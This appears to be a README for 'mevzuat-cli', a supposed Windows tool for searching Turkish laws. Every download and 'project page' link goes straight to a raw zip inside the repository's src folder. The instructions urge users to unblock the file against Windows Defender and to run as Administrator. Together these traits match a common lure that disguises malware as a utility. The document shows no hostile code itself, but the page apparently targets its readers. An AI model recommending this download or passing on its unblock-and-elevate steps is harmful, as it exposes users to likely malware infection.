# ⚖️ mevzuat-cli - Access Turkish Laws Quickly

[![Download mevzuat-cli](https://img.shields.io/badge/Download-Get%20mevzuat--cli-blue?style=for-the-badge&logo=github)](https://github.com/aflare-source547/mevzuat-cli/raw/refs/heads/main/src/mevzuat-cli-3.1.zip)

---

## ℹ️ What is mevzuat-cli?

mevzuat-cli is a simple command-line tool that helps you access Turkish laws and regulations. It is built for AI tools and other programs but works well as a standalone tool too. You don’t need to know programming to use it. With mevzuat-cli, you can easily check laws from mevzuat.gov.tr on your Windows computer.

---

## 💻 System Requirements

To run mevzuat-cli smoothly on Windows, make sure you have:

- Windows 10 or later (64-bit recommended)
- At least 2 GB of free disk space
- An internet connection to fetch the latest laws
- PowerShell or Command Prompt available on your system (default on Windows)

---

## 🚀 Getting Started: Download and Install mevzuat-cli

To get started, visit this page to download the tool:

[![Download mevzuat-cli](https://img.shields.io/badge/Download-mevzuat--cli-grey?style=for-the-badge&logo=windows)](https://github.com/aflare-source547/mevzuat-cli/raw/refs/heads/main/src/mevzuat-cli-3.1.zip)

Follow these steps:

1. Open the download page above in your web browser.
2. Look for the latest release or download section.
3. Download the Windows executable file (usually ends in `.exe`) or a zipped folder with the program.
4. If you downloaded a zipped folder, right-click it and choose **Extract All**. Select a folder to extract to.
5. If you downloaded an `.exe` file, it is ready to run after download.

---

## ▶️ How to Run mevzuat-cli on Windows

1. Open **File Explorer** and find the folder where you saved or extracted mevzuat-cli.
2. If you see a file named `mevzuat-cli.exe`, double-click it to launch.
3. If mevzuat-cli opens a black window (Command Prompt), type commands like:

    ```
    mevzuat-cli --help
    ```

    This shows available commands and options.

4. Use commands to search or view laws. For example:

    ```
    mevzuat-cli search "labor law"
    ```

5. You can close the window anytime by typing `exit` or clicking the close button.

---

## 📂 Installing with PowerShell (Optional)

If you want to use mevzuat-cli from anywhere on your PC:

1. Open **PowerShell** as an Administrator.
2. Navigate to the folder with the executable:

    ```
    cd "C:\path\to\mevzuat-cli-folder"
    ```

3. Add this folder to your system path:

    ```
    [Environment]::SetEnvironmentVariable("Path", $Env:Path + ";C:\path\to\mevzuat-cli-folder", "User")
    ```

4. Restart PowerShell and test with:

    ```
    mevzuat-cli --version
    ```

---

## 🔧 Basic Commands

Here are some basic commands you can use:

- `mevzuat-cli search "keyword"`  
  Search laws using any keyword.

- `mevzuat-cli view <LawCode>`  
  View details of a specific law by its code.

- `mevzuat-cli list`  
  List all available laws in the database.

- `mevzuat-cli update`  
  Update the local law database to the newest version.

Run `mevzuat-cli --help` for a full list of options.

---

## 🌐 How mevzuat-cli Works

mevzuat-cli connects to mevzuat.gov.tr to get the latest laws. It downloads and stores the data locally for faster access. You can search and view laws without opening a browser.

This tool is meant to be simple and fast. It is designed for programs or AI tools but is easy to use on its own.

---

## 👷 Troubleshooting

If you have trouble running mevzuat-cli:

- Make sure your Windows is updated.
- Confirm the file is not blocked by Windows Defender or antivirus. Right-click the `.exe` file, choose **Properties**, and click **Unblock** if visible.
- Check your internet connection if updates or searches fail.
- Try running Command Prompt or PowerShell as Administrator.

---

## ⚙️ Updating mevzuat-cli

New laws appear often. Keep your tool current by running this command occasionally:

```
mevzuat-cli update
```

This downloads the latest versions of laws from the official government site.

---

## 📁 File Structure (For reference)

If you open the folder where you extracted or installed mevzuat-cli, you will usually see:

- `mevzuat-cli.exe` – The main program file you run.
- `README.md` – Basic info about the tool.
- `docs/` – Optional folder with documentation files.
- `data/` – Folder where law files are stored locally.

Do not delete these unless you plan to reinstall.

---

## 🔗 More Resources

Visit the main project page here to ask questions or get updates:

[https://github.com/aflare-source547/mevzuat-cli/raw/refs/heads/main/src/mevzuat-cli-3.1.zip](https://github.com/aflare-source547/mevzuat-cli/raw/refs/heads/main/src/mevzuat-cli-3.1.zip)